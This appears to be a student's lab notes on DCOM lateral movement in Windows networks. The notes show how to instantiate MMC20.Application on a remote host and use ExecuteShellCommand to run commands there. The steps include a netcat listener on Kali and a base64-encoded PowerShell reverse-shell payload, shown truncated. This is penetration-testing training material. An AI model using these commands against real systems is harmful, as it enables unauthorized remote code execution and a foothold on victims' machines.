  
DCOM (_Distributed Component Object Model_)

- COM
    - System for creating software components that interact with each other
    - COM was created for either same-process or cross-process interaction
    - Extended to DCOM for interaction between multiple computers over a network
- Interaction with DCOM is performed over RPC on TCP port 135
    - [Local administrator] access is required to call the DCOM Service Control Manager
        - (API)
- DCOM lateral movement techniques
    - Cybereason
        - [https://www.cybereason.com/blog/dcom-lateral-movement-techniques](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)

Example:

- _Microsoft Management Console_ (MMC) COM application
    - Employed for scripted automation of Windows systems.
- MMC Application Class allows the creation of _Application Objects_
    - Exposes the ExecuteShellCommand method under the Document.ActiveView property
        - [Allows the execution of any shell command as long as the authenticated user is authorized (i.e. local admin)]
- Set up:
    - jen user logged in from the already compromised Windows 11 CLIENT74 host.
- Start:  
    - From an elevated PowerShell prompt, we can instantiate a remote MMC 2.0 application by specifying the target IP of FILES04 as the second argument of the GetTypeFromProgID method.  
    - `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.218.72"))`  
    - Once the application object is saved into the _$dcom_ variable, we can pass the required argument to the application via the **ExecuteShellCommand** method. The method accepts four parameters: **Command**, **Directory**, **Parameters**, and **WindowState**. We're only interested in the first and third parameters, which will be populated with **cmd** and **/c calc**.  
    - `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")`  
    - Once we execute these two PowerShell lines from CLIENT74, we should have spawned an instance of the calculator app.  
    - Because it's within Session 0, we can verify the calculator app is running with **tasklist** and filtering out the output with **findstr**.  
    - `tasklist | findstr "calc"`  
    - Start listener on Kali  
    - `nv -lvnp 443`  
    - Replace our DCOM payload with the base64 encoded reverse shell with from Python script from _WMI and WinRM_ section.  
    - `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A... AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`  
    - verify on kali  
    - `whoami`  
    - `hostname`